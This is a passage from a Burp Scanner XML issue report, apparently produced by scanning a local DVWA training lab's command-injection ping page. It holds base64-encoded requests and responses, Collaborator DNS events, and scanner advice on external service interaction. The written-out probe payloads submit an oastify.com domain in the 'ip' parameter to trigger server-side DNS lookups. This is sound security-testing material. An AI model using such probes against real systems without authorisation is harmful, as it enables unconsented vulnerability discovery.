FQVENIQTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGkvIj5TUUwgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaV9ibGluZC8iPlNRTCBJbmplY3Rpb24gKEJsaW5kKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3dlYWtfaWQvIj5XZWFrIFNlc3Npb24gSURzPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX2QvIj5YU1MgKERPTSk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfci8iPlhTUyAoUmVmbGVjdGVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19zLyI+WFNTIChTdG9yZWQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NwLyI+Q1NQIEJ5cGFzczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2phdmFzY3JpcHQvIj5KYXZhU2NyaXB0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2VjdXJpdHkucGhwIj5EVldBIFNlY3VyaXR5PC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9waHBpbmZvLnBocCI+UEhQIEluZm88L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2Fib3V0LnBocCI+QWJvdXQ8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9sb2dvdXQucGhwIj5Mb2dvdXQ8L2E+PC9saT4KPC91bD4KCQkJCTwvZGl2PgoKCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJtYWluX2JvZHkiPgoKCQkJCQ0KPGRpdiBjbGFzcz0iYm9keV9wYWRkZWQiPg0KCTxoMT5WdWxuZXJhYmlsaXR5OiBDb21tYW5kIEluamVjdGlvbjwvaDE+DQoNCgk8ZGl2IGNsYXNzPSJ2dWxuZXJhYmxlX2NvZGVfYXJlYSI+DQoJCTxoMj5QaW5nIGEgZGV2aWNlPC9oMj4NCg0KCQk8Zm9ybSBuYW1lPSJwaW5nIiBhY3Rpb249IiMiIG1ldGhvZD0icG9zdCI+DQoJCQk8cD4NCgkJCQlFbnRlciBhbiBJUCBhZGRyZXNzOg0KCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJpcCIgc2l6ZT0iMzAiPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCI+DQoJCQk8L3A+Cg0KCQk8L2Zvcm0+DQoJCTxwcmU+OzsgY29tbXVuaWNhdGlvbnMgZXJyb3IgdG8gNTQuNzcuMTM5LjIzIzUzOiB0aW1lZCBvdXQKOzsgY29tbXVuaWNhdGlvbnMgZXJyb3IgdG8gNTQuNzcuMTM5LjIzIzUzOiB0aW1lZCBvdXQKOzsgY29tbXVuaWNhdGlvbnMgZXJyb3IgdG8gNTQuNzcuMTM5LjIzIzUzOiB0aW1lZCBvdXQKOzsgY29tbXVuaWNhdGlvbnMgZXJyb3IgdG8gMy4yNDguMzMuMjUyIzUzOiB0aW1lZCBvdXQKOzsgbm8gc2VydmVycyBjb3VsZCBiZSByZWFjaGVkCgoKPC9wcmU+DQoJPC9kaXY+DQoNCgk8aDI+TW9yZSBJbmZvcm1hdGlvbjwvaDI+DQoJPHVsPg0KCQk8bGk+PGEgaHJlZj0iaHR0cHM6Ly93d3cuc2NyaWJkLmNvbS9kb2MvMjUzMDQ3Ni9QaHAtRW5kYW5nZXJzLVJlbW90ZS1Db2RlLUV4ZWN1dGlvbiIgdGFyZ2V0PSJfYmxhbmsiPmh0dHBzOi8vd3d3LnNjcmliZC5jb20vZG9jLzI1MzA0NzYvUGhwLUVuZGFuZ2Vycy1SZW1vdGUtQ29kZS1FeGVjdXRpb248L2E+PC9saT4NCgkJPGxpPjxhIGhyZWY9Imh0dHA6Ly93d3cuc3M2NC5jb20vYmFzaC8iIHRhcmdldD0iX2JsYW5rIj5odHRwOi8vd3d3LnNzNjQuY29tL2Jhc2gvPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vd3d3LnNzNjQuY29tL250LyIgdGFyZ2V0PSJfYmxhbmsiPmh0dHA6Ly93d3cuc3M2NC5jb20vbnQvPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwczovL293YXNwLm9yZy93d3ctY29tbXVuaXR5L2F0dGFja3MvQ29tbWFuZF9JbmplY3Rpb24iIHRhcmdldD0iX2JsYW5rIj5odHRwczovL293YXNwLm9yZy93d3ctY29tbXVuaXR5L2F0dGFja3MvQ29tbWFuZF9JbmplY3Rpb248L2E+PC9saT4NCgk8L3VsPg0KPC9kaXY+CgoJCQkJPGJyIC8+PGJyIC8+CgkJCQkKCgkJCTwvZGl2PgoKCQkJPGRpdiBjbGFzcz0iY2xlYXIiPgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9InN5c3RlbV9pbmZvIj4KCQkJCTxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSJWaWV3IEhlbHAiIGNsYXNzPSJwb3B1cF9idXR0b24iIGlkPSdoZWxwX2J1dHRvbicgZGF0YS1oZWxwLXVybD0nLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3ZpZXdfaGVscC5waHA/aWQ9ZXhlYyZzZWN1cml0eT1oaWdoJmxvY2FsZT1lbicgKSI+IDxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSJWaWV3IFNvdXJjZSIgY2xhc3M9InBvcHVwX2J1dHRvbiIgaWQ9J3NvdXJjZV9idXR0b24nIGRhdGEtc291cmNlLXVybD0nLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3ZpZXdfc291cmNlLnBocD9pZD1leGVjJnNlY3VyaXR5PWhpZ2gnICkiPiA8ZGl2IGFsaWduPSJsZWZ0Ij48ZW0+VXNlcm5hbWU6PC9lbT4gYWRtaW48YnIgLz48ZW0+U2VjdXJpdHkgTGV2ZWw6PC9lbT4gaGlnaDxiciAvPjxlbT5Mb2NhbGU6PC9lbT4gZW48YnIgLz48ZW0+UEhQSURTOjwvZW0+IGRpc2FibGVkPGJyIC8+PGVtPlNRTGkgREI6PC9lbT4gbXlzcWw8L2Rpdj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJmb290ZXIiPgoKCQkJCTxwPkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3A+CgkJCQk8c2NyaXB0IHNyYz0nLi4vLi4vL2R2d2EvanMvYWRkX2V2ZW50X2xpc3RlbmVycy5qcyc+PC9zY3JpcHQ+CgoJCQk8L2Rpdj4KCgkJPC9kaXY+CgoJPC9ib2R5PgoKPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>162.158.201.117</originIp>
      <time>2024-Mar-20 19:24:44.009 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>gvftvl0l372g8lrpx10o9md4wv2oqeea22psdh.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>3441570187362182144</serialNumber>
    <type>134217728</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="172.22.0.3">http://web</host>
    <path><![CDATA[/vulnerabilities/exec/]]></path>
    <location><![CDATA[/vulnerabilities/exec/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>uvt7vz0z3l2u8zr3xf0290diw922qsek2cp2dr.oastify.com</b> was submitted in the <b>ip</b> parameter.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvdnVsbmVyYWJpbGl0aWVzL2V4ZWMvIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvb2tpZTogc2VjdXJpdHk9aGlnaA0KQ29udGVudC1MZW5ndGg6IDIxDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KDQppcD11dnQ3dnowejNsMnU4enIzeGYwMjkwZGl3OTIycXNlazJjcDJkci5vYXN0aWZ5LmNvbSZTdWJtaXQ9U3VibWl0]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDE5OjI1OjA0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD1oMmU4bGVwdDZkOGZhZTI0ZHRrMDhuZDhtbjsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogNDM1NQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCjwhRE9DVFlQRSBodG1sPgoKPGh0bWwgbGFuZz0iZW4tR0IiPgoKCTxoZWFkPgoJCTxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPgoKCQk8dGl0bGU+VnVsbmVyYWJpbGl0eTogQ29tbWFuZCBJbmplY3Rpb24gOjogRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiAoRFZXQSkgdjEuMTAgKkRldmVsb3BtZW50KjwvdGl0bGU+CgoJCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii4uLy4uL2R2d2EvY3NzL21haW4uY3NzIiAvPgoKCQk8bGluayByZWw9Imljb24iIHR5cGU9IlxpbWFnZS9pY28iIGhyZWY9Ii4uLy4uL2Zhdmljb24uaWNvIiAvPgoKCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIuLi8uLi9kdndhL2pzL2R2d2FQYWdlLmpzIj48L3NjcmlwdD4KCgk8L2hlYWQ+CgoJPGJvZHkgY2xhc3M9ImhvbWUiPgoJCTxkaXYgaWQ9ImNvbnRhaW5lciI+CgoJCQk8ZGl2IGlkPSJoZWFkZXIiPgoKCQkJCTxpbWcgc3JjPSIuLi8uLi9kdndhL2ltYWdlcy9sb2dvLnBuZyIgYWx0PSJEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIiAvPgoKCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJtYWluX21lbnUiPgoKCQkJCTxkaXYgaWQ9Im1haW5fbWVudV9wYWRkZWQiPgoJCQkJPHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vLiI+SG9tZTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vaW5zdHJ1Y3Rpb25zLnBocCI+SW5zdHJ1Y3Rpb25zPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9zZXR1cC5waHAiPlNldHVwIC8gUmVzZXQgREI8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvYnJ1dGUvIj5CcnV0ZSBGb3JjZTwvYT48L2xpPgo8bGkgY2xhc3M9InNlbGVjdGVkIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZXhlYy8iPkNvbW1hbmQgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NyZi8iPkNTUkY8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9maS8uP3BhZ2U9aW5jbHVkZS5waHAiPkZpbGUgSW5jbHVzaW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvdXBsb2FkLyI+RmlsZSBVcGxvYWQ8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jYXB0Y2hhLyI+SW5zZWN1cmUgQ0FQVENIQTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGkvIj5TUUwgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaV9ibGluZC8iPlNRTCBJbmplY3Rpb24gKEJsaW5kKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3dlYWtfaWQvIj5XZWFrIFNlc3Npb24gSURzPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX2QvIj5YU1MgKERPTSk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfci8iPlhTUyAoUmVmbGVjdGVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19zLyI+WFNTIChTdG9yZWQpPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NwLyI+Q1NQIEJ5cGFzczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2phdmFzY3JpcHQvIj5KYXZhU2NyaXB0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2VjdXJpdHkucGhwIj5EVldBIFNlY3VyaXR5PC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9waHBpbmZvLnBocCI+UEhQIEluZm88L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2Fib3V0LnBocCI+QWJvdXQ8L2E+PC9saT4KPC91bD48dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9sb2dvdXQucGhwIj5Mb2dvdXQ8L2E+PC9saT4KPC91bD4KCQkJCTwvZGl2PgoKCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJtYWluX2JvZHkiPgoKCQkJCQ0KPGRpdiBjbGFzcz0iYm9keV9wYWRkZWQiPg0KCTxoMT5WdWxuZXJhYmlsaXR5OiBDb21tYW5kIEluamVjdGlvbjwvaDE+DQoNCgk8ZGl2IGNsYXNzPSJ2dWxuZXJhYmxlX2NvZGVfYXJlYSI+DQoJCTxoMj5QaW5nIGEgZGV2aWNlPC9oMj4NCg0KCQk8Zm9ybSBuYW1lPSJwaW5nIiBhY3Rpb249IiMiIG1ldGhvZD0icG9zdCI+DQoJCQk8cD4NCgkJCQlFbnRlciBhbiBJUCBhZGRyZXNzOg0KCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJpcCIgc2l6ZT0iMzAiPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlN1Ym1pdCIgdmFsdWU9IlN1Ym1pdCI+DQoJCQk8L3A+Cg0KCQk8L2Zvcm0+DQoJCTxwcmU+UElORyBQdWJsaWNJbnRlcmFjdGlvbk5MQi0zYmRkZjVmZjZhYmI5MWI2LmVsYi5ldS13ZXN0LTEuYW1hem9uYXdzLmNvbSAoMy4yNDguMzMuMjUyKSA1Nig4NCkgYnl0ZXMgb2YgZGF0YS4KCi0tLSBQdWJsaWNJbnRlcmFjdGlvbk5MQi0zYmRkZjVmZjZhYmI5MWI2LmVsYi5ldS13ZXN0LTEuYW1hem9uYXdzLmNvbSBwaW5nIHN0YXRpc3RpY3MgLS0tCjQgcGFja2V0cyB0cmFuc21pdHRlZCwgMCByZWNlaXZlZCwgMTAwJSBwYWNrZXQgbG9zcywgdGltZSAzMDQ5bXMKCjwvcHJlPg0KCTwvZGl2Pg0KDQoJPGgyPk1vcmUgSW5mb3JtYXRpb248L2gyPg0KCTx1bD4NCgkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vd3d3LnNjcmliZC5jb20vZG9jLzI1MzA0NzYvUGhwLUVuZGFuZ2Vycy1SZW1vdGUtQ29kZS1FeGVjdXRpb24iIHRhcmdldD0iX2JsYW5rIj5odHRwczovL3d3dy5zY3JpYmQuY29tL2RvYy8yNTMwNDc2L1BocC1FbmRhbmdlcnMtUmVtb3RlLUNvZGUtRXhlY3V0aW9uPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vd3d3LnNzNjQuY29tL2Jhc2gvIiB0YXJnZXQ9Il9ibGFuayI+aHR0cDovL3d3dy5zczY0LmNvbS9iYXNoLzwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cDovL3d3dy5zczY0LmNvbS9udC8iIHRhcmdldD0iX2JsYW5rIj5odHRwOi8vd3d3LnNzNjQuY29tL250LzwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cHM6Ly9vd2FzcC5vcmcvd3d3LWNvbW11bml0eS9hdHRhY2tzL0NvbW1hbmRfSW5qZWN0aW9uIiB0YXJnZXQ9Il9ibGFuayI+aHR0cHM6Ly9vd2FzcC5vcmcvd3d3LWNvbW11bml0eS9hdHRhY2tzL0NvbW1hbmRfSW5qZWN0aW9uPC9hPjwvbGk+DQoJPC91bD4NCjwvZGl2PgoKCQkJCTxiciAvPjxiciAvPgoJCQkJCgoJCQk8L2Rpdj4KCgkJCTxkaXYgY2xhc3M9ImNsZWFyIj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJzeXN0ZW1faW5mbyI+CgkJCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBIZWxwIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0naGVscF9idXR0b24nIGRhdGEtaGVscC11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X2hlbHAucGhwP2lkPWV4ZWMmc2VjdXJpdHk9aGlnaCZsb2NhbGU9ZW4nICkiPiA8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBTb3VyY2UiIGNsYXNzPSJwb3B1cF9idXR0b24iIGlkPSdzb3VyY2VfYnV0dG9uJyBkYXRhLXNvdXJjZS11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X3NvdXJjZS5waHA/aWQ9ZXhlYyZzZWN1cml0eT1oaWdoJyApIj4gPGRpdiBhbGlnbj0ibGVmdCI+PGVtPlVzZXJuYW1lOjwvZW0+IGFkbWluPGJyIC8+PGVtPlNlY3VyaXR5IExldmVsOjwvZW0+IGhpZ2g8YnIgLz48ZW0+TG9jYWxlOjwvZW0+IGVuPGJyIC8+PGVtPlBIUElEUzo8L2VtPiBkaXNhYmxlZDxiciAvPjxlbT5TUUxpIERCOjwvZW0+IG15c3FsPC9kaXY+CgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0iZm9vdGVyIj4KCgkJCQk8cD5EYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIChEVldBKSB2MS4xMCAqRGV2ZWxvcG1lbnQqPC9wPgoJCQkJPHNjcmlwdCBzcmM9Jy4uLy4uLy9kdndhL2pzL2FkZF9ldmVudF9saXN0ZW5lcnMuanMnPjwvc2NyaXB0PgoKCQkJPC9kaXY+CgoJCTwvZGl2PgoKCTwvYm9keT4KCjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>162.158.201.118</originIp>
      <time>2024-Mar-20 19:25:04.336 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>uvt7vz0z3l2u8zr3xf0290diw922qsek2cp2dr.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
</issues>
